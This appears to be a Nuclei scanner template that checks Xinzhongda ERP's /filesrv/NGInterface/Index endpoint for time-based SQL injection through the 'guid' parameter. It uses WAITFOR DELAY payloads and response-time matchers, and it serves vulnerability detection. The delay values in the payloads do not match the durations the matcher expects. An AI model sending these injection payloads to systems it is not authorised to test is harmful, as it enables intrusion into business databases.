id: xinzhongdaERP-NGInterface-sql-time

info:
  name: 新中大ERP企业管理软件 NGInterface SQL注入漏洞
  author: xinzhongdaERP
  severity: high
  tags: sql injection

http:
  - raw:
      - |
        POST /filesrv/NGInterface/Index HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=utf-8

        type=getfilelist&guid=';WAITFOR+DELAY+'0:0:2'--
      - |
        POST /filesrv/NGInterface/Index HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=utf-8

        type=getfilelist&guid=';WAITFOR+DELAY+'0:0:4'--
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and